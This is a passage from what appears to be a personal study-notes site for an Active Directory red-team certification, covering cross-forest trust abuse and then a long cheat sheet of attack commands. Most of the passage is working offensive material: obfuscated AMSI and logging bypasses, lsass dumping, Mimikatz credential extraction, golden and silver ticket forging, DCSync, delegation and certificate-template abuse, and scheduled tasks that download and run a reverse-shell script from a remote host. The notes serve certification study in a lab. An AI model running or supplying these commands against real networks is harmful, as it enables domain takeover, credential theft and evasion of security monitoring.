/sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt \t/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\\AD\\Tools\\kekeo_old\\sharedwitheu.kirbi\"'   Get a TGS for a service (CIFS below) in the target forest by using the forged trust ticket:  .\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\sharedwitheu.kirbi CIFS/euvendor-dc.euvendor.local      Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well    Use the TGS to access the target resource which must be explicitly shared:  .\\kirbikator.exe lsa CIFS.euvendor-dc.euvendor.local.kirbi ls \\\\euvendor-dc.euvendor.local\\eushare\\   We can also use Rubeus:  C:\\Users\\Public\\Rubeus.exe asktgs /ticket:C:\\Users\\Public\\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt      This is fine but why can’t we access all resources just like Intra forest?   SID Filtering is the answer.   It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary.   This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.      But there is a catch:       Reference:   MS-PAC: Privilege Attribute Certificate Data Structure      This means, if we have an external trust (or a forest trust with SID history enabled -/enablesidhistory:yes), we can inject a SIDHistory for RID &gt; 1000 to access resources accessible to that identity or group in the target trusting forest.    We had DA access to eu.local. Let’s enumerate trusts from a PSRemoting session on eu-dc:  Get-ADTrust -Filter *      SIDFilteringForestAware is set to True, it means SIDHistory is enabled across the forest trust.   Please remember that still only RID &gt; 1000 SIDs will be allowed across the trust boundary:  Get-ADGroup -Identity EUAdmins -Server euvendor.local   From eu-dc, create a TGT with SIDHistory of EUAdmins group:  Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\\Users\\Public\\euvendornet.kirbi\"'   Request a TGS:  .\\asktgs.exe C:\\Users\\Public\\euvendornet.kirbi HTTP/euvendor-net.euvendor.local   Inject that into current session:  .\\kirbikator.exe lsa HTTP.euvendor-net.euvendor.local.kirbi  Or  C:\\Users\\Public\\Rubeus.exe asktgs /ticket:C:\\Users\\Public\\euvendornet.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt   Access the euvendor-net machine using PSRemoting:  Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential   Trust Abuse (MSSQL Servers)   Same material as in the CRTP:   CRTP - Trust Abuse (MSSQL Servers)   Foreign Security Principals      A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).       Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.   FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.   Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.   PowerView:  Find-ForeignGroup -Verbose Find-ForeignUser -Verbose   Using ActiveDirectory module:  Get-ADObject -Filter {objectClass -eq \"foreignSecurityPrincipal\"}      Access to resources in a forest trust can also be provided without using FSPs using ACLs.   Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group   Let’s enumerate ACLs for the dbvendor.local domain using the reverse shell we have on db.local:  Find-InterestingDomainAcl -Domain dbvendor.local   Abusing PAM Trust      PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages.       PAM trust provides the ability to access the production forest with high privileges without using credentials of the bastion forest. Thus, better security for the bastion forest which is much desired.   To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.      By enumerating trusts and hunting for access, we can enumerate that we have Administrative access in other forest.    From techcorp-dc:  Get-ADTrust -Filter * Get-ADObject -Filter {objectClass -eq \"foreignSecurityPrincipal\"} -Server bastion.local   On bastion-dc, enumerate if there is a PAM trust:  $bastiondc = New-PSSession bastion-dc.bastion.local Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc   Check which users are members of the Shadow Principals:  Invoke-Command -ScriptBlock {Get-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc   Establish a direct PSRemoting session on bastion-dc and access production.local:  Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential   All attacks paths:      ","categories": ["notes","crte"],
        "tags": ["intermediate","AD","Windows"],
        "url": "/notes/crte/cross/",
        "teaser": "/assets/images/posts/crte/crte-teaser5.jpg"
      },{
        "title": "5 - Cheat Sheet",
        "excerpt":"Cheat Sheet   As we know, these exams are time-based. So, I created this cheat sheet to make sure the syntax of the commands are correct and consequently I dont lose any time with BS.      The important part is to understand the content; the cheat sheet is just an auxiliary tool in the process.       There is no hashes or informations of the exams here!      Copy Button added - tell me what u think              Bypass                          AMSI bypass:        Set-Item ('Va'+'rI'+'a'+'blE:1'+'q2'+'uZx') ([TYpE](\"F\"+'rE'))  (Get-variable (('1Q'+'2U') +'zX')).\"A`ss`Embly\".\"GET`TY`Pe\"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD\"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE`T`VaLUE)(${n`ULl},${t`RuE})               Script Block logging bypass:        [Reflection.Assembly]::\"l`o`AdwIThPa`Rti`AlnamE\"(('S'+'ystem'+'.C'+'ore')).\"g`E`TTYPE\"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der')).\"gET`FI`eLd\"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance')).\"seTVa`l`Ue\"([Ref].\"a`sSem`BlY\".\"gE`T`TyPE\"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der')).\"gEtFIe`Ld\"(('e'+'twProvid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static')).\"gE`Tva`lUe\"($null),0)               .NET AMSI bypass:        $ZQCUW = @\" using System; using System.Runtime.InteropServices; public class ZQCUW { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $ZQCUW $BBWHVWQ = [ZQCUW]::LoadLibrary(\"$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))\") $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, \"$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))\") $p = 0 [ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) $TLML = \"0xB8\" $PURX = \"0x57\" $YNWL = \"0x00\" $RTGX = \"0x07\" $XVON = \"0x80\" $WRUD = \"0xC3\" $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD) [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)                         Enumeration                          AD Module: Import:        Import-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1               Get-ADUser -Filter * | Select -ExpandProperty samaccountname Get-ADComputer –Filter * | select –expand name Get-ADGroup -Identity 'Domain Admins' -Properties * Get-ADGroup -Identity machineadmins -Properties Description Get-ADGroupMember -Identity 'Domain Admins' Get-ADGroupMember -Identity 'Enterprise Admins' Get-ADGroupMember -Identity 'Enterprise Admins' -Server domain.local Get-ADOrganizationalUnit -Identity 'OU=StudentsMachines,DC=us,DC=domain,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name Get-ACL 'AD:\\CN=Domain Admins,CN=Users,DC=us,DC=domain,DC=local' | select -ExpandProperty Access (Get-ADForest).Domains Get-ADTrust -Filter * Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} Get-ADTrust -Filter * -Server domain.local               Powerview: Import        . C:\\AD\\Tools\\PowerView.ps1               (Get-DomainPolicy).KerberosPolicy Get-DomainGPOLocalGroup Get-DomainGroupMember -Identity &lt;group&gt; Get-DomainOU (Get-DomainOU -Identity &lt;OU&gt;).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name Get-DomainGPO (Get-DomainOU -Identity &lt;OU&gt;).gplink Get-DomainGPO -Identity '{&lt;result of .gplink&gt;}' Get-DomainObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs -Verbose Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"&lt;user&gt;\"} Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"&lt;group&gt;\"} Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} Get-ForestTrust -Forest &lt;forest&gt;                         Powershell Stager                      C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat . C:\\AD\\Tools\\PowerUp.ps1 Invoke-AllChecks Invoke-ServiceAbuse -Name ALG -UserName domain\\studentuserx -Verbose               Same attack with accesschk64 from SysInternals:        .\\accesschk64.exe -uwcqv 'user' *  sc.exe config ALG binPath= \"net localgroup administrators domain\\user /add\" sc.exe stop ALG sc.exe start ALG sc.exe config ALG binPath= \"C:\\WINDOWS\\System32\\alg.exe\" sc.exe stop ALG sc.exe start ALG               Look for local administrative access w/ Powerview:        Find-LocalAdminAccess -Verbose Find-WMILocalAdminAccess.ps1 Find-PSRemotingLocalAdminAccess.ps1               Recursively look for group membership:        function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {   $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)    $groups   if ($groups.count -gt 0) {     foreach ($group in $groups) {       Get-ADPrincipalGroupMembershipRecursive $group     }   } }                        ACL entries                Check if any of the groups has interesting ACL entries:        Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'} Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}                         LAPS             Import-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1 Import-Module C:\\AD\\Tools\\AdmPwd.PS\\AdmPwd.PS.psd1 -Verbose C:\\AD\\Tools\\Get-LapsPermissions.ps1               With Powerview:        Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}               Read the password:        Get-ADComputer -Identity &lt;computer&gt; -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd Get-AdmPwdPassword -ComputerName &lt;computer&gt; Get-DomainObject -Identity &lt;computer&gt; | select -ExpandProperty ms-mcs-admpwd               Access the machine with the password:        winrs -r:&lt;computer&gt; -u:.\\administrator -p:&lt;passwd&gt; cmd $passwd = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential (\"&lt;computer&gt;\\administrator\", $passwd) $mailmgmt = New-PSSession -ComputerName &lt;computer&gt; -Credential $creds $mailmgmt                         Extract Credentials                      winrs:        winrs net use x: \\\\&lt;computer&gt;\\C$\\Users\\Public /user:&lt;computer&gt;\\Administrator &lt;password&gt; echo F | xcopy C:\\AD\\Tools\\Loader.exe x:\\Loader.exe net use x: /d               Bypass behaviour detection:        winrs -r:&lt;computer&gt; -u:.\\administrator -p:&lt;password&gt; cmd netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X               Extract:        C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::keys               Microsoft signed binary to download NetLoader:        winrs -r:&lt;computer&gt; -u:.\\administrator -p:&lt;password&gt; \"bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\\\Users\\\\Public\\\\Loader.exe\"               PowerShell Remoting and Invoke-Mimi:        $passwd = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential (\"&lt;computer&gt;\\administrator\", $passwd) $mailmgmt = New-PSSession -ComputerName &lt;computer&gt; -Credential $creds Enter-PSSession $mailmgmt               Bypass AMSI before proceeding!        Invoke-Command -FilePath C:\\AD\\Tools\\Invoke-Mimi.ps1 -Session $mailmgmt Enter-PSSession $mailmgmt Invoke-Mimi -Command '\"sekurlsa::keys\"'                         gMSA                      C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat Import-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1 Get-ADServiceAccount -Filter * Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword                        You have to open a shell with the user that has permission to read gMSA, after that                Import AD Module again, then: $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword' To decode the password we can use DSinternals: Import-Module C:\\AD\\Tools\\DSInternals_v4.7\\DSInternals\\DSInternals.psd1 $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword                        After that, you can PTH to see if the user has access to another machine!                          PTH             From an elevated shell:        C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::opassth /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;password&gt; /run:cmd.exe\" \"exit\"               using NTLM:        C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::opassth /user:&lt;user&gt; /domain:&lt;domain&gt;  /ntlm:&lt;password&gt; /run:cmd.exe\" \"exit\"  C:\\AD\\Tools\\Rubeus.exe s4u /user:&lt;user&gt; /aes256:&lt;password&gt; /impersonateuser:administrator /msdsspn:CIFS/&lt;machine.domain&gt; /altservice:HTTP /domain:&lt;domain&gt; /ptt               Doesn’t need elevation:        C:\\AD\\Tools\\Rubeus.exe asktgt /domain:&lt;domain&gt; /user:&lt;user&gt; /aes256:&lt;password&gt; opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt                         Application Whitelisting                      CLM, AppLocker, WDAC                Verify if PowerShell is running in Constrained Language Mode:        $ExecutionContext.SessionState.LanguageMode               Check for AppLocker (if there is an error, the AppLocker is not in use):        reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2 Get-AppLockerPolicy –Effective               Verify WDAC:        Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard CodeIntegrityPolicyEnforcementStatus : 2 UsermodeCodeIntegrityPolicyEnforcementStatus : 2               Check out Lolbas Project on Github                  Lets DUMP lsass*                Get the PID of lsass.exe process:        tasklist /FI \"IMAGENAME eq lsass.exe\" rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 708 C:\\Users\\Public\\lsass.dmp full               Copy the lsass to your machine:        echo F | xcopy \\\\us-jump\\C$\\Users\\Public\\lsass.dmp C:\\AD\\Tools\\lsass.dmp               Run Mimikatz with Admin Priv, then:        sekurlsa::minidump C:\\AD\\Tools\\lsass.DMP privilege::debug sekurlsa::keys               Check for Certificates:        echo F | xcopy C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat \\\\us-jump\\C$\\Users\\Public\\RunWithRegistryNonAdmin.bat /Y echo F | xcopy C:\\AD\\Tools\\InviShell\\InShellProf.dll \\\\us-jump\\C$\\Users\\Public\\InShellProf.dll /Y               winrs -r:us-jump cmd C:\\Users\\Public\\RunWithRegistryNonAdmin.bat ls cert:\\LocalMachine\\My ls cert:\\LocalMachine\\My\\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\\Users\\Public\\user.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)               Copy the certificate:        echo F | xcopy \\\\us-jump\\C$\\Users\\Public\\user.pfx C:\\AD\\Tools\\user.pfx                           Unconstrained delegation                      Get-ADComputer -Filter {TrustedForDelegation -eq $True}               Access the machine with unconstrained deleg, then:        C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat cd C:\\AD\\Tools\\ . C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1 Find-PSRemotingLocalAdminAccess -Verbose               Copy Rubeus using xcopy and execute using winrs:        echo F | xcopy C:\\AD\\Tools\\Rubeus.exe \\\\us-web\\C$\\Users\\Public\\Rubeus.exe /Y winrs -r:us-web cmd.exe C:\\Users\\Public\\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap               Copy and execute Rubeus using PowerShell Remoting:        $usweb1 = New-PSSession us-web Copy-Item -ToSession $usweb1 -Path C:\\AD\\Tools\\Rubeus.exe -Destination C:\\Users\\Public Enter-PSSession $usweb1 cd C:\\Users\\Public .\\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap               Abuse the printer bug:        C:\\AD\\Tools\\MS-RPRN.exe \\\\dc.domain.local \\\\us-web.domain.local               Copy the Base64EncodedTicket, then:        C:\\AD\\Tools\\Rubeus.exe ptt /ticket:TGTofDC$               Run DCSync attack:        C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User domain\\krbtgt --Domain domain.local --DomainController dc.domain.local               To get EA access         it’s the same:                  Monitor the DC of the root of the forest         Execute MS-RPRN with the DC target         Copy the Base64 and PTT         DCSync EA (Administrator of the root forest)               C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User domain\\administrator --Domain domain.local --DomainController domain-dc.domain.local               In a different forest                  If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well.                         ASKTGT         Send Rubeus to the target machine         Access the machine with WINRS         Execute Rubeus monitor (with the Target Forest)         Execute MS-RPRN (with the Target Forest)         Copy base64 &amp; PTT with Rubeus               Now we can run DCSync to the Targeted Forest:        C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User usvendor\\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local                         Constrained delegation                      Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo               Collect the service from msDS-AllowedToDelegateTo and access with Rubeus S4U:        klist winrs -r:us-mssql.domain.local cmd.exe               To execute on another Forest just add the flag -Server:        Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo -Server domain.local               We need access to the machine that has Constrained Deleg enabled:        C:\\AD\\Tools\\Rubeus.exe hash /password:Qwerty@123 /user:&lt;user&gt; /domain:domain.local C:\\AD\\Tools\\Rubeus.exe s4u /user:&lt;user&gt; /rc4:&lt;hash&gt; /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt               With the LDAP service ticket, We can DCSync:        C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User domain\\krbtgt --Domain domain.local --DomainController dc.domain.local C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User domain\\administrator --Domain domain.local --DomainController dc.domain.local                         ACLs Write Permissions             If you have Write permission:        echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\us-mgmt\\C$\\Users\\Public\\Loader.exe /Y winrs -r:us-mgmt cmd netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::keys               If you get any user, run the full enumeration on that user:        C:\\AD\\Tools\\PowerView.ps1 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}               With GenericWrite we can set Resource-based Constrained Delegation (RBCD):        C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat Import-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1 $comps = 'user1$','user2$' Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose               Extract AES of your machine:        C:\\AD\\Tools\\SafetyKatz.exe -Command \"sekurlsa::keys\" \"exit\"               Go for the one with SID S-1-5-18 that is a well-known SID for the SYSTEM user:        C:\\AD\\Tools\\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt klist winrs -r:us-helpdesk cmd               To copy our loader to the machine, we need to access the filesystem. So, request a TGS for CIFS using Rubeus:        C:\\AD\\Tools\\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\us-helpdesk\\C$\\Users\\Public\\Loader.exe /Y winrs -r:us-helpdesk cmd netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe                        If any new users are found, PTH and Find-PSRemotingLocalAdminAccess -Verbose                          Tickets                      GOLDEN         Without using Invoke-Mimi.ps1:        C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\" klist echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\dc\\C$\\Users\\Public\\Loader.exe /Y winrs -r:dc cmd netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe               Using Invoke-Mimi.ps1 and PowerShell Remoting:        . C:\\AD\\Tools\\Invoke-Mimi.ps1 Invoke-Mimi -Command '\"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt\"' $sess = New-PSSession &lt;machine name&gt; Enter-PSSession -Session $sess  # bypass AMSI   exit Invoke-Command -FilePath C:\\AD\\Tools\\Invoke-Mimi.ps1 -Session $sess Enter-PSSession -Session $sess Invoke-Mimi -Command '\"lsadump::lsa /patch\"'               SILVER         C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target&gt; /service:HOST /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\" klist               Start a listening in another prompt:        C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat . C:\\AD\\Tools\\powercat.ps1 powercat -l -v -p 443 -t 1000 schtasks /create /S &lt;target machine&gt; /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN \"Userx\" /TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.x/Invoke-PowerShellTcpEx.ps1''')'\" schtasks /Run /S &lt;target machine&gt; /TN \"Userx\"               We should get a shell on the listener prompt.                  For WMI, we need 2 tickets – HOST and RPCSS                C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target dc&gt; /service:HOST /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\" C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target dc&gt; /service:RPCSS /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\" Get-WmiObject -Class win32_operatingsystem -ComputerName &lt;computer name&gt;                         DCSync                      C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat . C:\\AD\\Tools\\PowerView.ps1               Check if the user has Replication Rights:        Get-DomainObjectAcl -SearchBase \"dc=us,dc=domain,dc=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"studentuserx\"}               With DA privileges We can add those rights:        C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::opassth /user:administrator /domain:domain.local /aes256:&lt;hash&gt; /run:cmd.exe\" \"exit\"               Using Powerview:        Add-DomainObjectAcl -TargetIdentity \"dc=us,dc=domain,dc=local\" -PrincipalIdentity studentuserx -Rights DCSync -PrincipalDomain domain.local -TargetDomain domain.local -Verbose               Using AD Module with Set-ADACL from RACE:        Set-ADACL -DistinguishedName 'DC=us,DC=domain,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose                        From a normal shell, check the rights again                Now we can execute DCSync attacks:        C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:domain\\krbtgt\" \"exit\" Invoke-Mimi -Command '\"lsadump::dcsync /user:domain\\krbtgt\"'                         AD CS                      C:\\AD\\Tools\\Certify.exe cas C:\\AD\\Tools\\Certify.exe find               ENROLLEE_SUPPLIES_SUBJECT attribute means we can request a certificate for ANY user:        C:\\AD\\Tools\\Certify.exe find /enrolleeSuppliesSubject C:\\AD\\Tools\\Rubeus.exe asktgt /user:&lt;user&gt; /certificate:C:\\AD\\Tools\\user.pfx /password:SecretPass@123 /nowrap /ptt C:\\AD\\Tools\\Certify.exe request /ca:domain-DC.domain.local\\DOMAIN-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator                        Copy all the text between —–BEGIN RSA PRIVATE KEY—– and —–END CERTIFICATE—– and save it to cert.pem                C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\cert.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out C:\\AD\\Tools\\DA.pfx         Finally, request a TGT for the DA:        C:\\AD\\Tools\\Rubeus.exe asktgt /user:Administrator /certificate:C:\\AD\\Tools\\DA.pfx /password:SecretPass@123 /nowrap /ptt winrs -r:dc whoami               For EA         Request and convert to PFX, then request the TGT:        C:\\AD\\Tools\\Rubeus.exe asktgt /user:domain.local\\Administrator /dc:domain-dc.domain.local /certificate:C:\\AD\\Tools\\EA.pfx /password:SecretPass@123 /nowrap /ptt winrs -r:domain-dc whoami                         Azure AD Connect             Get-ADUser -Filter \"samAccountName -like 'MSOL_*'\" -Server domain.local -Properties * | select SamAccountName,Description | fl C:\\AD\\Tools\\Rubeus.exe asktgt /domain:domain.local /user:&lt;user&gt; /aes256:&lt;hash&gt; /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt echo F | xcopy C:\\AD\\Tools\\InviShell\\InShellProf.dll \\\\us-adconnect\\C$\\Users\\&lt;user&gt;\\Downloads\\InShellProf.dll /Y echo F | xcopy C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat \\\\us-adconnect\\C$\\Users\\&lt;user&gt;\\Downloads\\RunWithRegistryNonAdmin.bat /Y winrs -r:us-adconnect cmd cd C:\\Users\\&lt;user&gt;\\Downloads RunWithRegistryNonAdmin.bat               Extract credentials of MSOL_:        iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/adconnect.ps1') ADconnect               Now we can run DCsync (From elevated shell):        runas /user:domain.local\\MSOL_16fb75d0227d /netonly cmd C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:domain\\administrator /domain:domain.local\" \"exit\"               DCsync (from a normal shell):        runas /user:domain.local\\MSOL_16fb75d0227d /netonly cmd C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat . C:\\AD\\Tools\\Invoke-Mimi.ps1 Invoke-Mimi -Command '\"lsadump::dcsync /user:domain\\administrator /domain:domain.local\"'                         Domain Privesc (TrustKey &amp; KRBTGT)                      Using TRUSTKEY         With DA - Escalate to EA or DA of the parent domain:         C:\\AD\\Tools\\Rubeus.exe asktgt /user:administrator /aes256:&lt;hash&gt; /opsec 